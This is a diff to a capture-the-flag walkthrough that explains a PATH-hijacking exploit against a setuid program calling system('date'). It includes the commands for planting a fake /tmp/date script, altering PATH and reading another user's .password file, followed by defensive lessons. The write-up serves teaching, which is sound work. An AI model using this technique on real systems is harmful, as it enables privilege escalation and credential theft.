@@ -99,6 +99,12 @@ as opposed to the current user.
 So even though we are logged in as user `level00` now,
 when we execute this program it will run as `level01`.
 
+TODO: cut the crap. it's obvious what is what:
+the source of the vulnerable program is /at/some/path,
+the vulnerable program is setuid,
+the password file is only readable by the owner
+-> our task is to bend the setuid program to our will
+
 Great, so how can we use this to our benefit?
 As we checked earlier,
 we cannot read the `.password` file owned by `level01`.
@@ -129,13 +135,47 @@ the program:
       return 0;
     }
 
-The vulnerability: using the "system" call in C with a relative
-path
-The exploit: that PATH environment variable can be
-manipulated to trick the program into executing an arbitrary
-script
-The lesson: Avoid the "system" call in C, or at least
-validate it properly
+The most suspicious line here is of course `system("date")`.
+What does it really do?
+We can look that up in `man system`: it executes the specified command by calling `/bin/sh -c`.
+And since the specified command is not an absolute path,
+the shell will search for it in the list of paths defined in `$PATH`,
+and use the first one it finds.
+
+Therein lies our exploit:
+
+1. Create a script named "date" in a directory readable by user `level01`,
+   and make it print the content of `/home/level01/.password`
+
+        $ cat > /tmp/date
+        #!/bin/cat /home/level01/.password
+        ^D  # press Control-D to stop editing
+
+2. Make it executable
+
+        $ chmod +x /tmp/date
+
+3. Prepend the directory of the script to `PATH`,
+   so that our script is found before the real `date` program.
+
+        $ PATH=/tmp:$PATH
+
+Now if we run the `level01` command again:
+
+    $ /levels/level01/level01
+    Current time: aepeefoo
+    #!/bin/cat /home/level01/.password
+
+Bingo! Now we can login as user `level01` using the revealed password.
+
+What can we learn from all this?
+
+- Make sure you have read and understood the documentation of library methods you use:
+  `man system` explains that it should not be used in setuid programs.
+- If you must use `system()`,
+  be careful with relative paths,
+  as the user can easily subvert the intended behavior by manipulating the `PATH`.
+  The `level01` program would have been a lot safer if had used the full path `/bin/date` instead of just `date`.
 
 Level 2:
 https://github.com/janosgyerik/ctf-o-matic/blob/master/ctf1/code/levels/level02/level02.py
